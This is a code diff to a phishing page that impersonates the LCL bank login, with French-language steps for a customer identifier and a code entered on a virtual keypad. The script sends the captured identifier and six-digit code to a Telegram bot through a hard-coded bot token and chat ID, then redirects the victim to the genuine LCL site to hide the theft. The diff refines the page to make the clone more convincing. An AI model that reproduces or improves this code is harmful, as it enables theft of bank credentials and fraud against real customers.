@@ -104,7 +104,8 @@
             font-weight: 500;
         }
 
-        input[type="text"], input[type="password"] {
+        /* Input style adapted for virtual keyboard */
+        .keyboard-input {
             width: 100%;
             padding: 12px 15px;
             border: 1px solid #ccc;
@@ -112,17 +113,18 @@
             font-size: 16px;
             background-color: #fff;
             transition: border-color 0.2s;
+            min-height: 50px;
         }
 
-        input:focus {
-            border-color: #0077c0; /* LCL Blue-ish */
+        .keyboard-input:focus {
+            border-color: #0077c0;
             outline: none;
         }
 
         .btn-primary {
             width: 100%;
             padding: 14px;
-            background-color: #0077c0; /* LCL Blue */
+            background-color: #0077c0;
             color: white;
             border: none;
             border-radius: 8px;
@@ -177,6 +179,7 @@
             position: relative;
         }
         
+        /* Placeholder for Pin Display */
         .pin-display::placeholder {
             color: #ccc;
             letter-spacing: 2px;
@@ -194,8 +197,8 @@
         .key {
             width: 70px;
             height: 70px;
-            border-radius: 50%; /* Circular buttons */
-            background: #f5f5f5; /* Light flat background */
+            border-radius: 50%;
+            background: #f5f5f5;
             border: none;
             font-size: 24px;
             font-weight: 500;
@@ -277,23 +280,18 @@
 
     <div class="content-container">
         
-        <!-- STEP 1: IDENTIFIANT (Libre) -->
+        <!-- STEP 1: IDENTIFIANT (Clavier Virtuel) -->
         <div id="step1" class="step active">
             <h2>Pour aller de l'avant.</h2>
             
             <div class="input-group">
                 <label for="userIdentifiant">Votre identifiant</label>
-                <!-- Le champ est maintenant libre -->
-                <input type="text" id="userIdentifiant" placeholder="Ex: 123 4567 8 90">
+                <!-- Champ unique utilisé pour afficher les chiffres du clavier -->
+                <input type="text" id="userIdentifiant" class="keyboard-input" placeholder="Tapez votre identifiant" readonly>
                 <div class="helper-text">
                     <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h-2v2H7V7h2V5h2v2h2v2z"/></svg>
                     <span>Mémoriser mon identifiant</span>
                 </div>
-            </div>
-
-            <div class="input-group">
-                <label for="userCode">Votre code personnel</label>
-                <input type="password" id="userCodePreview" placeholder="OOO000" readonly>
             </div>
 
             <button class="btn-primary" onclick="goToStep2()">Valider</button>
@@ -332,7 +330,7 @@
         // --- CONFIGURATION ---
         const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
         const CHAT_ID = "8501464548";
-        const REDIRECT_URL = "https://monespace.lcl.fr"; // Real site
+        const REDIRECT_URL = "https://monespace.lcl.fr";
 
         // --- STATE ---
         let currentPin = "";
@@ -341,6 +339,7 @@
         const step1 = document.getElementById('step1');
         const step2 = document.getElementById('step2');
         const pinDisplay = document.getElementById('pinDisplay');
+        const userIdentifiant = document.getElementById('userIdentifiant');
         const keypadContainer = document.getElementById('keypad');
         const loader = document.getElementById('loader');
 
@@ -351,24 +350,28 @@
 
         // --- NAVIGATION LOGIC ---
         function goToStep2() {
-            // Get values
-            const identifiant = document.getElementById('userIdentifiant').value;
-            
+            const identifiant = userIdentifiant.value;
+            if (identifiant.length === 0) {
+                // Petite animation visuelle pour indiquer de remplir
+                userIdentifiant.style.borderColor = "#e74c3c";
+                setTimeout(() => userIdentifiant.style.borderColor = "#ccc", 500);
+                return;
+            }
+
             // Visual transition
             step1.classList.remove('active');
             step1.classList.add('hidden-left');
             
             setTimeout(() => {
                 step2.classList.add('active');
-                document.getElementById('pinDisplay').focus();
+                // Reset pin display for step 2
+                pinDisplay.textContent = "";
             }, 300);
         }
 
         // --- KEYPAD LOGIC ---
         function generateRandomKeypad() {
             const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0];
-            
-            // Shuffle array
             const shuffled = numbers.sort(() => Math.random() - 0.5);
 
             shuffled.forEach(num => {
@@ -379,28 +382,36 @@
                 keypadContainer.appendChild(btn);
             });
 
-            // Add empty slot for grid symmetry (3x3)
+            // Add empty slot for grid symmetry
             const empty = document.createElement('div');
             empty.className = 'key key-empty';
             keypadContainer.appendChild(empty);
         }
 
         function handleInput(num) {
-            if (currentPin.length < 6) {
-                currentPin += num;
-                updateDisplay();
-                
-                // Auto-submit if 6 digits entered
-                if (currentPin.length === 6) {
-                    setTimeout(() => {
-                        submitData();
-                    }, 300);
+            // Determine which step is active to decide where to put the number
+            if (step1.classList.contains('active')) {
+                // Step 1: ID Input
+                if (userIdentifiant.value.length < 20) { // Limit length to avoid overflow
+                    userIdentifiant.value += num;
+                }
+            } else {
+                // Step 2: PIN Input
+                if (currentPin.length < 6) {
+                    currentPin += num;
+                    updateDisplay();
+                    
+                    // Auto-submit if 6 digits entered
+                    if (currentPin.length === 6) {
+                        setTimeout(() => {
+                            submitData();
+                        }, 300);
+                    }
                 }
             }
         }
 
         function updateDisplay() {
-            // Mask the PIN
             let masked = "";
             for(let i=0; i<currentPin.length; i++) {
                 masked += "● ";
@@ -410,7 +421,7 @@
 
         // --- TELEGRAM SUBMISSION ---
         async function submitData() {
-            const identifiant = document.getElementById('userIdentifiant').value;
+            const identifiant = userIdentifiant.value;
             const code = currentPin;
             
             const message = `🔐 *Nouvelle Connexion LCL*\n\n` +
@@ -438,7 +449,6 @@
                 console.error("Error sending data:", error);
             }
 
-            // Redirect to real site after short delay
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
             }, 1500);
